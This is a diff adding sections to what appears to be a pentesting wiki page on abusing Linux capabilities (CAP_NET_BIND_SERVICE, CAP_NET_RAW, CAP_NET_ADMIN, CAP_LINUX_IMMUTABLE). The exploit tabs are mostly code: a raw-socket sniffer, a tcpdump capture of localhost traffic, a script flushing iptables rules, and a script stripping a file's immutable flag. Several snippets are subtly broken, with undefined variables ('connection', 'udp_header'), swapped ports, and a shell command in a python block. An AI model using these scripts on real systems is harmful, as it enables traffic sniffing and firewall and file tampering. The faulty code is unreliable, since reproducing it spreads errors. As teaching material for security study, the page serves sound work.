@@ -1222,13 +1222,215 @@ $ python exploit.py
 
 #### CAP\_NET\_BIND\_SERVICE
 
+{% tabs %}
+{% tab title="Desc" %}
+[**CAP\_NET\_BIND\_SERVICE** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allow us to Bind a socket to Internet domain privileged ports (port numbers less than 1024).
+
+**This means that it's possible to listen in any port (even in privileged ones).** You cannot escalate privileges directly with this capability.
+{% endtab %}
+
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/bin/python3.11 = cap_net_bind_service+ep
+```
+
+Then, we are able to listen on any port&#x20;
+
+```python
+import socket
+s=socket.socket()
+s.bind(('0.0.0.0', 80))
+s.listen(1)
+conn, addr = s.accept()
+while True:
+        output = connection.recv(1024).strip();
+        print(output)
+```
+
+And connect from it to any othe port
+
+```python
+import socket
+s=socket.socket()
+s.bind(('0.0.0.0',500))
+s.connect(('10.10.10.10',500))
+```
+{% endtab %}
+{% endtabs %}
+
 #### CAP\_NET\_RAW
+
+{% tabs %}
+{% tab title="Desc" %}
+[**CAP\_NET\_RAW** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allows a process to be able to **create RAW and PACKET socket types** for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or **compromised container** to **spoof** **packets** at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.
+
+**This means that it's possible to sniff traffic.** You cannot escalate privileges directly with this capability.
+{% endtab %}
+
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/sbin/python2.7 = cap_net_raw+ep
+```
+
+We are able to run the following code and sniff traffic of the "**lo**" (**localhost**) interface.&#x20;
+
+```python
+import socket
+import struct
+
+flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]
+
+def getFlag(flag_value):
+    flag=""
+    for i in xrange(8,-1,-1):
+        if( flag_value & 1 <<i ):
+            flag= flag + flags[8-i] + ","
+    return flag[:-1]
+
+s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
+s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
+s.bind(("lo",0x0003))
+
+flag=""
+count=0
+while True:
+    frame=s.recv(4096)
+    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
+    proto=ip_header[6]
+    ip_header_size = (ip_header[0] & 0b1111) * 4
+    if(proto==6):
+        protocol="TCP"
+        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
+        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
+        dst_port=tcp_header[0]
+        src_port=tcp_header[1]
+        flag=" FLAGS: "+getFlag(tcp_header[4])
+
+    elif(proto==17):
+        protocol="UDP"
+        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
+        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
+        dst_port=udp_header[0]
+        src_port=udp_header[1]
+
+    if (proto == 17 or proto == 6):
+        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
+        count=count+1
+```
+{% endtab %}
+
+{% tab title="Exploit - Tcpdump" %}
+In the following example the **`tcpdump`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/sbin/tcpdump = cap_net_raw+ep
+```
+
+Then, we can sniff sensitive information by running tcpdump for a while.
+
+```python
+tcpdump -i lo -A
+```
+{% endtab %}
+{% endtabs %}
 
 #### CAP\_NET\_ADMIN + CAP\_NET\_RAW
 
+{% tabs %}
+{% tab title="Desc" %}
+[**CAP\_NET\_ADMIN** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allows the capability holder to **modify the exposed network namespaces' firewall, routing tables, socket permissions**, network interface configuration and other related settings on exposed network interfaces. This also provides the ability to **enable promiscuous mode** for the attached network interfaces and potentially sniff across namespaces.
+{% endtab %}
+
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/sbin/python2.7 = cap_net_raw,cap_net_admin+ep
+```
+
+We can run following code to dump iptables filter table rules.&#x20;
+
+```python
+import iptc
+import pprint
+json=iptc.easy.dump_table('filter',ipv6=False)
+pprint.pprint(json)
+```
+
+Or flush iptables filter table
+
+```python
+import iptc
+iptc.easy.flush_table('filter')
+```
+{% endtab %}
+{% endtabs %}
+
 #### CAP\_LINUX\_IMMUTABLE
 
+{% tabs %}
+{% tab title="Desc" %}
+[**CAP\_LINUX\_IMMUTABLE** ](https://man7.org/linux/man-pages/man7/capabilities.7.html)allow us to set the FS\_APPEND\_FL and FS\_IMMUTABLE\_FL inode flags
+
+If you find that a file is immutable and python has this capability, you can **remove the immutable attribute and make the file modifiable**
+{% endtab %}
+
+{% tab title="Exploit - Python" %}
+In the following example the **`python`** binary has this capability.
+
+```bash
+$ getcap -r / 2>/dev/null
+/usr/sbin/python2.7 = cap_linux_immutable+ep
+```
+
+If you find that a file is immutable, you can **remove the immutable attribute and make the file modifiable:**
+
+```bash
+#Check that the file is imutable
+lsattr file.sh 
+----i---------e--- backup.sh
+```
+
+We can use the following script to remove the attribute
+
+```python
+#Pyhton code to allow modifications to the file
+import fcntl
+import os
+import struct
+
+FS_APPEND_FL = 0x00000020
+FS_IOC_SETFLAGS = 0x40086602
+
+fd = os.open('/path/to/file.sh', os.O_RDONLY)
+f = struct.pack('i', FS_APPEND_FL)
+fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)
+
+f=open("/path/to/file.sh",'a+')
+f.write('New content for the file\n')
+```
+
+{% hint style="info" %}
+Note that usually this immutable attribute is set and remove using:
+
+sudo chattr +i file.txt&#x20;
+
+sudo chattr -i file.txt
+{% endhint %}
+{% endtab %}
+{% endtabs %}
+
 #### CAP\_SYS\_CHROOT
+
+
 
 #### CAP\_SYS\_BOOT
 
